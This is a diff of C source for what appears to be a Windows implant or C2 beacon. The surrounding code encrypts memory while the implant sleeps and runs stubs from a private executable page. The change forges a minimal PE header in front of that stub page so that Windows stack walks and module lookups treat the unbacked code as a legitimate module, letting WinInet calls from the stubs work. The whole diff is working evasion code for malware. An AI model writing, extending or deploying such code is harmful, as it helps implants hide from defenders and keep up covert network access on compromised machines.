@@ -148,7 +148,20 @@ typedef char bw_assert_call_args[offsetof(BW_CTX, call_args) == 0xAB0 ? 1 : -1];
 volatile long g_bw_watchdog_fires;  /* test hook: watchdog rest-path count */
 int g_bw_dbg_before, g_bw_dbg_after;  /* test hook: block count before/after the keep-plaintext filter */
 
-static unsigned char * g_bw_stubs;   /* private RX page: enter/exit/watchdog */
+/* The stubs live on the second page of a private two-page allocation. The
+ * first page carries a minimal PE header, so that RtlPcToFileHeader - and
+ * with it GetModuleHandleEx(FROM_ADDRESS) - resolves a return address from
+ * the stub page to "a module", exactly as it does for a return address
+ * inside the beacon image. WinInet asks the shim engine (apphelp.dll, in
+ * every process without a manifest - our own-exe template) for its
+ * caller's module by walking the stack to the first non-system frame;
+ * given nothing it aborts and InternetOpenA hands back a bogus handle
+ * (0xcc0010, live 2026-11-24). The header says nothing but the layout. */
+#define BW_STUB_HEADER 0x1000
+#define BW_STUB_BYTES  0x2000
+
+static unsigned char * g_bw_stubs;   /* allocation base: [PE header][stubs] */
+static unsigned char * g_bw_code;    /* the RX stub page: enter/exit/watchdog/call */
 static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 
 #define BW_STATE_IDLE   0
@@ -527,6 +540,34 @@ static int bw_emit_refresh(unsigned char * e, long d0, long d1)
 	return n;
 }
 
+/* the minimal PE header on the allocation's first page: MZ -> PE, one
+ * executable section covering the stub page, SizeOfImage = the allocation -
+ * what RtlPcToFileHeader checks when it walks back from an address */
+static void bw_put_pe_header(unsigned char * base)
+{
+	IMAGE_DOS_HEADER *    dos = (IMAGE_DOS_HEADER *)base;
+	IMAGE_NT_HEADERS64 *  nt  = (IMAGE_NT_HEADERS64 *)(base + 0x40);
+	IMAGE_SECTION_HEADER * sec = (IMAGE_SECTION_HEADER *)(nt + 1);
+
+	nt->Signature = IMAGE_NT_SIGNATURE;
+	nt->FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64;
+	nt->FileHeader.NumberOfSections = 1;
+	nt->FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
+	nt->FileHeader.Characteristics = IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_DLL;
+	nt->OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
+	nt->OptionalHeader.SectionAlignment = 0x1000;
+	nt->OptionalHeader.FileAlignment = 0x200;
+	nt->OptionalHeader.SizeOfImage = BW_STUB_BYTES;
+	nt->OptionalHeader.SizeOfHeaders = BW_STUB_HEADER;
+	memcpy(sec->Name, ".text", 6);
+	sec->VirtualSize = BW_STUB_HEADER;
+	sec->VirtualAddress = BW_STUB_HEADER;
+	sec->SizeOfRawData = BW_STUB_HEADER;
+	sec->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
+	dos->e_magic = IMAGE_DOS_SIGNATURE; /* last: the walk stops on MZ */
+	dos->e_lfanew = 0x40;
+}
+
 static BOOL bw_build_pages(void)
 {
 	DWORD old = 0;
@@ -537,12 +578,14 @@ static BOOL bw_build_pages(void)
 		return TRUE;
 
 	g_bw_ctx = (BW_CTX *)VirtualAlloc(NULL, sizeof(BW_CTX), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-	g_bw_stubs = (unsigned char *)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	g_bw_stubs = (unsigned char *)VirtualAlloc(NULL, BW_STUB_BYTES, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (g_bw_ctx == NULL || g_bw_stubs == NULL)
 		return FALSE;
 	memset(g_bw_ctx, 0, sizeof(BW_CTX));
-	memset(g_bw_stubs, 0, 0x1000);
-	p = g_bw_stubs;
+	memset(g_bw_stubs, 0, BW_STUB_BYTES);
+	bw_put_pe_header(g_bw_stubs);
+	g_bw_code = g_bw_stubs + BW_STUB_HEADER;
+	p = g_bw_code;
 #define BW_BUILD_FAIL() do { 	VirtualFree(g_bw_ctx, 0, MEM_RELEASE);  g_bw_ctx = NULL; 	VirtualFree(g_bw_stubs, 0, MEM_RELEASE); g_bw_stubs = NULL; 	return FALSE; } while (0)
 
 	/* ---- enter_stub (called from C, rsp%16==8, [rsp]=ret_to_C) ----
@@ -801,9 +844,9 @@ static BOOL bw_build_pages(void)
 	bw_put64(p + BW_SB0Q_OFF, (unsigned long long)(size_t)g_bw_ctx->sbox0);
 	bw_put64(p + BW_SB1Q_OFF, (unsigned long long)(size_t)g_bw_ctx->sbox1);
 
-	if (!VirtualProtect(p, 0x1000, PAGE_EXECUTE_READ, &old))
+	if (!VirtualProtect(g_bw_stubs, BW_STUB_BYTES, PAGE_EXECUTE_READ, &old))
 		BW_BUILD_FAIL();
-	FlushInstructionCache(GetCurrentProcess(), p, 0x1000);
+	FlushInstructionCache(GetCurrentProcess(), g_bw_stubs, BW_STUB_BYTES);
 #undef BW_BUILD_FAIL
 	return TRUE;
 }
@@ -815,7 +858,12 @@ BOOL bofwin_supported(void)
 
 void * bofwin_test_stub_page(void)
 {
-	return g_bw_stubs; /* NULL before the first bw_build_pages */
+	return g_bw_code; /* NULL before the first bw_build_pages */
+}
+
+void * bofwin_test_base(void)
+{
+	return g_bw_stubs; /* the allocation base = the PE header page */
 }
 
 void bofwin_test_blocks(int * before, int * after)
@@ -929,7 +977,7 @@ static BOOL bw_window(const BW_TARGET * t)
 		pDelTimer = (BOOL (WINAPI *)(void *, void *, void *))(void *)DeleteTimerQueueTimer;
 		/* capture the stub address NOW - g_bw_stubs lives in .data and is
 		 * ciphertext after the mask loop. */
-		enter_fn = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);
+		enter_fn = (void (*)(void))(g_bw_code + BW_ENTER_OFF);
 
 	ctx->state = BW_STATE_OPEN;
 	ctx->rest_done = 0;
@@ -981,7 +1029,7 @@ static BOOL bw_window(const BW_TARGET * t)
 		if (watchdog < 50)
 			watchdog = (watchdog == 0) ? BW_DEFAULT_WATCHDOG_MS : 50;
 		if (!CreateTimerQueueTimer(&timer, NULL,
-		                           (WAITORTIMERCALLBACK)(void *)(g_bw_stubs + BW_WATCH_OFF),
+		                           (WAITORTIMERCALLBACK)(void *)(g_bw_code + BW_WATCH_OFF),
 		                           NULL, watchdog, 0,
 		                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION)) {
 			if (args_copy != NULL)
@@ -1105,7 +1153,7 @@ BOOL bofwin_call(void * fn, const unsigned long long * args, int nargs, unsigned
 	ctx->call_ret = 0;
 
 	memset(&t, 0, sizeof(t));
-	t.entry = (void (*)(void *, int))(g_bw_stubs + BW_CALL_OFF);
+	t.entry = (void (*)(void *, int))(g_bw_code + BW_CALL_OFF);
 	t.args = &ctx->call_fn;
 	t.image_only = TRUE;
 	t.avoid = ctx->call_args;
@@ -1125,6 +1173,11 @@ BOOL bofwin_supported(void)
 }
 
 void * bofwin_test_stub_page(void)
+{
+	return NULL;
+}
+
+void * bofwin_test_base(void)
 {
 	return NULL;
 }
